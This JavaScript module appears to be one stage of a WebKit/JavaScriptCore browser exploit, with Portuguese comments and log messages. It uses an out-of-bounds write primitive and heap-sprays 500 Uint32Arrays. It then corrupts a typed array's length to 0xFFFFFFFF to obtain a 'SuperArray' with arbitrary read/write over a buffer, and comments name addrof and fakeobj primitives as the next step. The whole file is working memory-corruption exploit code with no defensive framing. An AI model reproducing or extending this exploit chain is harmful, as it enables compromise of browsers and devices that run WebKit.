// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_EXACT_LOG_REPLICATION = "exactLogReplicationAndSuperArray_v28a";

// Constantes do seu Log.txt [00:51:23] (investigateControl_v7)
const OOB_OFFSET_0x68 = 0x68;
const OOB_OFFSET_0x6C = 0x6C;
const OOB_OFFSET_0x70_TRIGGER = 0x70; // Também é onde o m_length é pego

const INITIAL_VAL_PLANTED_AT_0x68 = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
const INITIAL_VAL_PLANTED_AT_0x6C = new AdvancedInt64(0xFFFFFFFF, 0xEEEEFFFF); // eeeeffff_ffffffff

const TRIGGER_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Valores ESPERADOS no oob_buffer APÓS o trigger, conforme seu Log.txt
const EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd
const EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER = new AdvancedInt64(0x11223344, 0xFFFFFFFF); // 0xffffffff_11223344

// Metadados esperados para o SuperArray (objeto JS corrompido)
const EXPECTED_SUPERARRAY_M_VECTOR = EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER; // Deve ser o que apareceu em 0x68
const EXPECTED_SUPERARRAY_M_LENGTH = 0xFFFFFFFF; // O LOW_DWORD do que apareceu em 0x70

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY = 0xFEEDF00D;
const MARKER_OFFSET_IN_OOB_DATA = 0x0; // Plantar no início dos dados do oob_buffer

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_EXACT_LOG_REPLICATION}: Replicar Log [00:51:23] e Validar SuperArray ---`, "test", FNAME_EXACT_LOG_REPLICATION);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_EXACT_LOG_REPLICATION);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_EXACT_LOG_REPLICATION);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xBAD00000 ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_EXACT_LOG_REPLICATION);

        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real, como no seu Log.txt
        logS3(`FASE 2: Plantando valores iniciais em oob_buffer (pré-trigger)...`, "info", FNAME_EXACT_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x68, INITIAL_VAL_PLANTED_AT_0x68, 8);
        oob_write_absolute(OOB_OFFSET_0x6C, INITIAL_VAL_PLANTED_AT_0x6C, 8);
        // O valor em 0x70 será o HIGH_DWORD de 0x6C (0xEEEEFFFF) + o trigger.
        // Não precisamos plantar nada em 0x70 separadamente antes do trigger, pois o trigger já o define.

        logS3("  Valores NO OOB_BUFFER ANTES do trigger (após nosso plantio):", "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${oob_read_absolute(OOB_OFFSET_0x68, 8).toString(true)} (Esperado: ${INITIAL_VAL_PLANTED_AT_0x68.toString(true)})`, "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${oob_read_absolute(OOB_OFFSET_0x6C, 8).toString(true)} (Esperado: ${INITIAL_VAL_PLANTED_AT_0x6C.toString(true)})`, "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (LOW_DWORD) = ${toHex(oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 4))}`, "info", FNAME_EXACT_LOG_REPLICATION);


        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] com ${TRIGGER_VALUE.toString(true)}...`, "info", FNAME_EXACT_LOG_REPLICATION);
        oob_write_absolute(OOB_OFFSET_0x70_TRIGGER, TRIGGER_VALUE, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_EXACT_LOG_REPLICATION);
        
        // Verificar os valores NO OOB_BUFFER após o trigger
        const val_0x68_after = oob_read_absolute(OOB_OFFSET_0x68, 8); 
        const val_0x6C_after = oob_read_absolute(OOB_OFFSET_0x6C, 8); 
        const val_0x70_after_low_dword = oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 4); 
        
        logS3(`  Valores NO OOB_BUFFER APÓS trigger:`, "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${val_0x68_after.toString(true)} (Seu Log de Sucesso: ${EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER.toString(true)})`, "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${val_0x6C_after.toString(true)} (Seu Log de Sucesso: ${EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER.toString(true)})`, "info", FNAME_EXACT_LOG_REPLICATION);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (LOW_DWORD) = ${toHex(val_0x70_after_low_dword)} (Esperado para m_length: ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})`, "info", FNAME_EXACT_LOG_REPLICATION);

        let oob_dynamics_match_log = val_0x68_after.equals(EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER) &&
                                     val_0x6C_after.equals(EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER) &&
                                     val_0x70_after_low_dword === EXPECTED_SUPERARRAY_M_LENGTH;

        if (oob_dynamics_match_log) {
            logS3("    !!!! Dinâmica de bytes no oob_buffer APÓS trigger CORRESPONDE ao seu Log de Sucesso [00:51:23] !!!!", "vuln", FNAME_EXACT_LOG_REPLICATION);
            document.title = "OOB DINÂMICA OK!";
        } else {
            logS3("    AVISO: Dinâmica de bytes no oob_buffer após trigger NÃO corresponde ao seu Log de Sucesso [00:51:23].", "warn", FNAME_EXACT_LOG_REPLICATION);
            document.title = "OOB Dinâmica DIFERENTE";
        }
        await PAUSE_S3(300);

        // FASE 4: Identificar SuperArray (pelo length)
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})...`, "info", FNAME_EXACT_LOG_REPLICATION);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_SUPERARRAY_M_LENGTH) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_EXACT_LOG_REPLICATION);
                document.title = `SUPERARRAY Idx ${i}! Len OK!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  SuperArray obtido. Seu m_vector DEVERIA ser ${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)}.`, "info", FNAME_EXACT_LOG_REPLICATION);
            logS3(`  Testando se este m_vector permite ler o oob_array_buffer_real...`, "info", FNAME_EXACT_LOG_REPLICATION);

            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY, 4);
            logS3(`    Marcador ${toHex(MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}]`, "info", FNAME_EXACT_LOG_REPLICATION);
            
            // Para ler o marcador, o índice no superArray seria:
            // (EndereçoAbsolutoDoMarcadorNoOOBBuffer - EndereçoAbsolutoApontadoPeloMVectorDoSuperArray) / 4
            // Se m_vector do superArray (EXPECTED_SUPERARRAY_M_VECTOR) é o dataPointer do oob_array_buffer_real,
            // então o índice para ler o marcador em oob_buffer.dataPointer + MARKER_OFFSET_IN_OOB_DATA
            // seria simplesmente MARKER_OFFSET_IN_OOB_DATA / 4.
            const index_to_read_marker_via_superarray = MARKER_OFFSET_IN_OOB_DATA / 4;
            
            try {
                const value_read_via_superarray = superArray[index_to_read_marker_via_superarray];
                logS3(`    SuperArray[${toHex(index_to_read_marker_via_superarray)}] leu: ${toHex(value_read_via_superarray)}`, "leak", FNAME_EXACT_LOG_REPLICATION);
                if (value_read_via_superarray === MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY) {
                    logS3(`      !!!! SUCESSO !!!! SuperArray com m_vector=${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} mapeia para o oob_array_buffer_real!`, "vuln", FNAME_EXACT_LOG_REPLICATION);
                    document.title = "SUPERARRAY FUNCIONAL!";
                    // AGORA TEMOS R/W NO OOB_BUFFER ATRAVÉS DO SUPERARRAY
                    // Próximo passo: addrof, fakeobj usando esta primitiva.
                } else {
                    logS3(`      Falha na verificação do marcador. SuperArray não parece mapear para oob_array_buffer_real como esperado.`, "error", FNAME_EXACT_LOG_REPLICATION);
                    document.title = "SuperArray Mapeamento Falhou";
                }
            } catch (e) {
                 logS3(`    Erro ao ler marcador via SuperArray: ${e.message}`, "error", FNAME_EXACT_LOG_REPLICATION);
                 document.title = "SuperArray Erro Leitura Marcador";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_EXACT_LOG_REPLICATION);
            document.title = "SuperArray NÃO Encontrado (v28a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_EXACT_LOG_REPLICATION}: ${e.message}`, "critical", FNAME_EXACT_LOG_REPLICATION);
        document.title = `${FNAME_EXACT_LOG_REPLICATION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_EXACT_LOG_REPLICATION} Concluído ---`, "test", FNAME_EXACT_LOG_REPLICATION);
    }
}
